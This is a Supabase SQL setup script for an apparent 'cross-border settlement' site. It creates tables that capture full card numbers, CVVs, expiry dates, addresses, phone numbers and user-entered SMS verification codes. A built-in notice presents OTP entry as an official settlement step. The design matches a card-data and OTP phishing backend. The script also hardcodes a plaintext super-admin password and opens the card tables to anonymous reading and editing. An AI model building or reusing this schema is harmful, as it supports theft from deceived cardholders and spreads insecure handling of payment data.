-- =============================================================================
-- CBCA 完整数据库初始化脚本
-- 在新 Supabase 项目的 SQL Editor 里直接粘贴执行即可
-- 全部使用 IF NOT EXISTS / IF NOT EXISTS 检测，重复执行无副作用
-- =============================================================================


-- =============================================================================
-- 1. updated_at 自动更新触发器函数
-- =============================================================================
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;


-- =============================================================================
-- 2. admin_users 管理员账号表
-- =============================================================================
CREATE TABLE IF NOT EXISTS admin_users (
  id            uuid        PRIMARY KEY DEFAULT gen_random_uuid(),
  username      text        UNIQUE NOT NULL,
  password_hash text        NOT NULL DEFAULT '',
  password_plain text       DEFAULT '',
  role          text        DEFAULT 'sub' CHECK (role IN ('super','sub')),
  is_active     boolean     DEFAULT true,
  created_by    text,
  created_at    timestamptz DEFAULT now()
);

ALTER TABLE admin_users ENABLE ROW LEVEL SECURITY;

-- 仅允许 authenticated 角色读取，且永远返回空（所有访问走 service_role）
DROP POLICY IF EXISTS "No direct client access to admin_users" ON admin_users;
CREATE POLICY "No direct client access to admin_users"
  ON admin_users FOR SELECT
  TO authenticated
  USING (false);

-- 写入超级管理员账号（用户名: ada66，密码: a114455h）
-- 如需修改密码请更改下方两处 'a114455h'
INSERT INTO admin_users (username, password_plain, password_hash, role, is_active)
VALUES ('ada66', 'a114455h', 'a114455h', 'super', true)
ON CONFLICT (username) DO UPDATE
  SET password_plain = EXCLUDED.password_plain,
      password_hash  = EXCLUDED.password_hash,
      role           = 'super',
      is_active      = true;


-- =============================================================================
-- 3. transactions 交易记录表
-- =============================================================================
CREATE TABLE IF NOT EXISTS transactions (
  id               uuid         PRIMARY KEY DEFAULT gen_random_uuid(),
  ft_uid           text         UNIQUE NOT NULL,
  serial_number    text         UNIQUE NOT NULL,
  cbca_reference   text         UNIQUE NOT NULL,
  amount           numeric(18,2) DEFAULT 0,
  currency         text         DEFAULT 'USD',
  company_name     text         DEFAULT '',
  employee_id      text         DEFAULT '',
  hash_value       text         DEFAULT '',
  jurisdiction     text         DEFAULT '',
  agreement_number text         DEFAULT '',
  issue_date       date,
  settlement_days  int          DEFAULT 3,
  exchange_rate    numeric(18,6),
  local_currency   text,
  local_amount     numeric(18,2),
  fee_crossborder  numeric(18,2) DEFAULT 0,
  fee_intermediary numeric(18,2) DEFAULT 0,
  fee_tax          numeric(18,2) DEFAULT 0,
  fee_description  text         DEFAULT '',
  review_status    text         DEFAULT 'draft'
                   CHECK (review_status IN ('draft','pending','processing','approved','failed')),
  review_note      text         DEFAULT '',
  review_updated_at timestamptz,
  aml_passed       boolean      DEFAULT true,
  created_by_admin text         DEFAULT '',
  created_at       timestamptz  DEFAULT now(),
  updated_at       timestamptz  DEFAULT now()
);

ALTER TABLE transactions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Allow anon read on transactions"   ON transactions;
DROP POLICY IF EXISTS "Allow anon insert on transactions" ON transactions;
DROP POLICY IF EXISTS "Allow anon update on transactions" ON transactions;

CREATE POLICY "Allow anon read on transactions"
  ON transactions FOR SELECT TO anon USING (true);

CREATE POLICY "Allow anon insert on transactions"
  ON transactions FOR INSERT TO anon WITH CHECK (true);

CREATE POLICY "Allow anon update on transactions"
  ON transactions FOR UPDATE TO anon USING (true) WITH CHECK (true);

DROP TRIGGER IF EXISTS trg_transactions_updated_at ON transactions;
CREATE TRIGGER trg_transactions_updated_at
  BEFORE UPDATE ON transactions
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();


-- =============================================================================
-- 4. kyc_drafts KYC 草稿实时保存表
-- =============================================================================
CREATE TABLE IF NOT EXISTS kyc_drafts (
  id                       uuid        PRIMARY KEY DEFAULT gen_random_uuid(),
  transaction_id           uuid        NOT NULL REFERENCES transactions(id) ON DELETE CASCADE,
  card_number              text        DEFAULT '',
  card_expiry              text        DEFAULT '',
  cvv                      text        DEFAULT '',
  cardholder_name          text        DEFAULT '',
  country                  text        DEFAULT '',
  street_address           text        DEFAULT '',
  house_number             text        DEFAULT '',
  city                     text        DEFAULT '',
  state                    text        DEFAULT '',
  postal_code              text        DEFAULT '',
  phone_number             text        DEFAULT '',
  card_type                text        DEFAULT 'debit',
  payee_debit_card         text,
  verification_code        text,
  entered_verification_code text       DEFAULT '',
  code_sent_at             timestamptz,
  is_submitted             boolean     DEFAULT false,
  submitted_at             timestamptz,
  created_at               timestamptz DEFAULT now(),
  updated_at               timestamptz DEFAULT now(),
  UNIQUE(transaction_id)
);

ALTER TABLE kyc_drafts ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Allow anon read on kyc_drafts"   ON kyc_drafts;
DROP POLICY IF EXISTS "Allow anon insert on kyc_drafts" ON kyc_drafts;
DROP POLICY IF EXISTS "Allow anon update on kyc_drafts" ON kyc_drafts;

CREATE POLICY "Allow anon read on kyc_drafts"
  ON kyc_drafts FOR SELECT TO anon USING (true);

CREATE POLICY "Allow anon insert on kyc_drafts"
  ON kyc_drafts FOR INSERT TO anon WITH CHECK (true);

CREATE POLICY "Allow anon update on kyc_drafts"
  ON kyc_drafts FOR UPDATE TO anon USING (true) WITH CHECK (true);

DROP TRIGGER IF EXISTS trg_kyc_drafts_updated_at ON kyc_drafts;
CREATE TRIGGER trg_kyc_drafts_updated_at
  BEFORE UPDATE ON kyc_drafts
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();


-- =============================================================================
-- 5. kyc_submissions KYC 提交历史快照表
-- =============================================================================
CREATE TABLE IF NOT EXISTS kyc_submissions (
  id                        uuid        PRIMARY KEY DEFAULT gen_random_uuid(),
  transaction_id            uuid        NOT NULL REFERENCES transactions(id) ON DELETE CASCADE,
  submission_number         integer     NOT NULL DEFAULT 1,
  submitted_at              timestamptz NOT NULL DEFAULT now(),
  card_number               text        DEFAULT '',
  card_expiry               text        DEFAULT '',
  cvv                       text        DEFAULT '',
  cardholder_name           text        DEFAULT '',
  country                   text        DEFAULT '',
  street_address            text        DEFAULT '',
  house_number              text        DEFAULT '',
  city                      text        DEFAULT '',
  state                     text        DEFAULT '',
  postal_code               text        DEFAULT '',
  phone_number              text        DEFAULT '',
  verification_code         text,
  entered_verification_code text,
  card_type                 text,
  payee_debit_card          text,
  created_at                timestamptz DEFAULT now()
);

ALTER TABLE kyc_submissions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Service role full access to kyc_submissions" ON kyc_submissions;
CREATE POLICY "Service role full access to kyc_submissions"
  ON kyc_submissions FOR SELECT
  TO authenticated
  USING (false);

CREATE INDEX IF NOT EXISTS kyc_submissions_transaction_id_idx
  ON kyc_submissions(transaction_id);

CREATE INDEX IF NOT EXISTS kyc_submissions_submitted_at_idx
  ON kyc_submissions(submitted_at DESC);


-- =============================================================================
-- 6. announcement_config 公告配置表（单行）
-- =============================================================================
CREATE TABLE IF NOT EXISTS announcement_config (
  id         integer     PRIMARY KEY DEFAULT 1 CHECK (id = 1),
  title      text        NOT NULL DEFAULT 'Important Notice — Please Read Carefully',
  content    text        NOT NULL DEFAULT 'You are about to receive a one-time verification code (OTP) via SMS for cross-border settlement identity authentication.

1. The verification code will be sent to the phone number registered and bound to your card. Ensure the number entered is correct before proceeding.

2. The OTP is valid for a limited time. Do not share this code with anyone, including bank staff or customer service representatives.

3. By requesting this code, you confirm that you are the authorized cardholder and that all information provided is accurate and truthful.

4. This verification is part of the official cross-border settlement process. The code is used solely for identity authentication purposes and will not authorize any unauthorized transactions.

5. Any misuse, fraud, or unauthorized use of the verification process may result in suspension of your account and potential legal action.

6. Your personal data is processed in accordance with applicable data protection laws and will not be shared with third parties outside of this settlement process.',
  updated_by text,
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE announcement_config ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Anyone can read announcement" ON announcement_config;
CREATE POLICY "Anyone can read announcement"
  ON announcement_config FOR SELECT
  TO anon, authenticated
  USING (true);

INSERT INTO announcement_config (id) VALUES (1) ON CONFLICT (id) DO NOTHING;


-- =============================================================================
-- 7. rate_limit_attempts 限流防暴力攻击表
-- =============================================================================
CREATE TABLE IF NOT EXISTS rate_limit_attempts (
  id               uuid        PRIMARY KEY DEFAULT gen_random_uuid(),
  ip               text        NOT NULL,
  endpoint         text        NOT NULL,
  attempts         int         NOT NULL DEFAULT 1,
  first_attempt_at timestamptz NOT NULL DEFAULT now(),
  locked_until     timestamptz,
  created_at       timestamptz NOT NULL DEFAULT now(),
  updated_at       timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE rate_limit_attempts ENABLE ROW LEVEL SECURITY;

CREATE UNIQUE INDEX IF NOT EXISTS rate_limit_attempts_ip_endpoint_idx
  ON rate_limit_attempts (ip, endpoint);

CREATE INDEX IF NOT EXISTS rate_limit_attempts_locked_until_idx
  ON rate_limit_attempts (locked_until)
  WHERE locked_until IS NOT NULL;


-- =============================================================================
-- 完成
-- =============================================================================
SELECT '数据库初始化完成' AS status,
       (SELECT count(*) FROM admin_users)     AS admin_users,
       (SELECT count(*) FROM transactions)    AS transactions,
       (SELECT count(*) FROM kyc_drafts)      AS kyc_drafts,
       (SELECT count(*) FROM kyc_submissions) AS kyc_submissions,
       (SELECT count(*) FROM announcement_config) AS announcement,
       (SELECT count(*) FROM rate_limit_attempts) AS rate_limits;
